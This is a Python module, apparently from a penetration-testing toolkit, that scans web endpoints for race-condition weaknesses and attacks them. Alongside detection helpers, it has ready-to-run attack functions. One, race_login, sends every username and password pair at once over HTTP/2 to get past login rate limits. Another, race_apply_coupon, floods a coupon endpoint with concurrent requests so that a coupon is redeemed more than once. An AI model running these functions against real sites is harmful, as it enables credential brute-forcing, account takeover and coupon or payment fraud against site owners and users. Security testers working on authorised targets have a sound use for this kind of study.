"""
auto_race.py - Automated Race Condition vulnerability scanner
Uses HTTP/2 single-packet attack for rate limit bypass
"""

import asyncio
import json
import re
import time
from typing import Optional, List, Dict


def _get_session():
    """Get HTTP session with fallback."""
    try:
        from tools.probe import _get_session as _gs
        return _gs()
    except (ImportError, ModuleNotFoundError):
        import requests
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return s


def detect_rate_limit(url: str, param: str = "username", method: str = "POST",
                      attempts: int = 5, delay: float = 0.1,
                      session_cookie: str = "") -> dict:
    """
    Detect if endpoint has rate limiting.
    Returns dict with: rate_limited, limit_count, lockout_window
    """
    session = _get_session()
    if session_cookie:
        session.headers["Cookie"] = session_cookie
    results = {
        "url": url,
        "rate_limited": False,
        "limit_count": 0,
        "responses": []
    }

    for i in range(attempts):
        try:
            if method.upper() == "POST":
                resp = session.post(url, data={param: f"test{i}"}, timeout=10)
            else:
                resp = session.get(url, params={param: f"test{i}"}, timeout=10)

            results["responses"].append({
                "attempt": i + 1,
                "status": resp.status_code,
                "length": len(resp.text),
                "has_rate_limit_msg": any(kw in resp.text.lower() for kw in
                    ['too many', 'rate limit', 'try again', 'locked', 'blocked'])
            })

            if any(kw in resp.text.lower() for kw in ['too many', 'rate limit', 'try again', 'locked']):
                results["rate_limited"] = True
                results["limit_count"] = i + 1
                break

            if resp.status_code == 429:
                results["rate_limited"] = True
                results["limit_count"] = i + 1
                break

        except Exception as e:
            results["responses"].append({"attempt": i + 1, "error": str(e)})

        time.sleep(delay)

    return results


async def _race_request(client, url: str, data: dict, cookies: dict,
                        method: str = "POST") -> dict:
    """Single async request for race condition."""
    try:
        if method.upper() == "POST":
            resp = await client.post(url, data=data, cookies=cookies, follow_redirects=False)
        else:
            resp = await client.get(url, params=data, cookies=cookies, follow_redirects=False)

        return {
            "status": resp.status_code,
            "success": resp.status_code == 302,
            "length": len(resp.text),
            "redirect": resp.headers.get("location", "")
        }
    except Exception as e:
        return {"error": str(e)}


async def race_login(url: str, usernames: List[str], passwords: List[str],
                     csrf_token: str = "", session_cookie: str = "",
                     username_field: str = "username",
                     password_field: str = "password",
                     csrf_field: str = "csrf") -> dict:
    """
    Race condition attack on login endpoint.
    Uses HTTP/2 single-packet attack to bypass rate limiting.
    """
    try:
        import httpx
    except ImportError:
        return {"error": "httpx not installed. Run: pip install httpx[http2]"}

    results = {
        "url": url,
        "total_attempts": 0,
        "successful": [],
        "errors": []
    }

    cookies = {}
    if session_cookie:
        cookies["session"] = session_cookie

    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = []
        for username in usernames:
            for password in passwords:
                data = {username_field: username, password_field: password}
                if csrf_token:
                    data[csrf_field] = csrf_token
                tasks.append(_race_request(client, url, data, cookies))

        results["total_attempts"] = len(tasks)
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for resp in responses:
            if isinstance(resp, Exception):
                results["errors"].append(str(resp))
            elif resp.get("success"):
                results["successful"].append(resp)

    return results


async def race_apply_coupon(url: str, coupon: str, concurrent: int = 20,
                            session_cookie: str = "",
                            csrf_token: str = "") -> dict:
    """
    Race condition attack to apply coupon multiple times.
    """
    try:
        import httpx
    except ImportError:
        return {"error": "httpx not installed"}

    cookies = {}
    if session_cookie:
        cookies["session"] = session_cookie

    data = {"coupon": coupon}
    if csrf_token:
        data["csrf"] = csrf_token

    results = {
        "url": url,
        "concurrent": concurrent,
        "responses": []
    }

    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [_race_request(client, url, data, cookies) for _ in range(concurrent)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

        for resp in responses:
            if isinstance(resp, Exception):
                results["responses"].append({"error": str(resp)})
            else:
                results["responses"].append(resp)

    return results


def detect_race_condition_candidates(url: str, html: str = "") -> dict:
    """
    Analyze page to find race condition attack candidates.
    """
    candidates = []

    # Common patterns that might be vulnerable
    patterns = [
        (r'/login', 'login_rate_limit'),
        (r'/cart/coupon', 'coupon_reuse'),
        (r'/transfer', 'double_spend'),
        (r'/vote', 'vote_duplication'),
        (r'/register', 'registration_race'),
        (r'/withdraw', 'withdrawal_race'),
    ]

    for pattern, attack_type in patterns:
        if re.search(pattern, html, re.IGNORECASE) or pattern in url:
            candidates.append({
                "endpoint": pattern,
                "attack_type": attack_type,
                "description": f"Potential {attack_type.replace('_', ' ')} vulnerability"
            })

    return {
        "url": url,
        "candidates": candidates,
        "count": len(candidates)
    }


def full_scan(url: str, session_cookie: str = "") -> dict:
    """
    Full race condition security scan.
    """
    results = {
        "url": url,
        "rate_limit_detection": None,
        "candidates": None,
        "findings": []
    }

    # 1. Detect rate limiting
    rate_limit = detect_rate_limit(url, session_cookie=session_cookie)
    results["rate_limit_detection"] = rate_limit

    if rate_limit.get("rate_limited"):
        results["findings"].append({
            "type": "rate_limit_detected",
            "severity": "info",
            "details": f"Rate limit at {rate_limit['limit_count']} attempts"
        })

    # 2. Find race condition candidates
    try:
        session = _get_session()
        if session_cookie:
            session.headers['Cookie'] = session_cookie
        resp = session.get(url, timeout=10)
        candidates = detect_race_condition_candidates(url, resp.text)
        results["candidates"] = candidates

        if candidates.get("count", 0) > 0:
            results["findings"].append({
                "type": "race_condition_candidates",
                "severity": "medium",
                "details": f"Found {candidates['count']} potential race condition endpoints"
            })
    except Exception as e:
        results["candidates_error"] = str(e)

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_race.py <url> [session_cookie]")
        sys.exit(1)

    url = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else ""
    result = full_scan(url, cookie)
    print(json.dumps(result, indent=2, default=str))
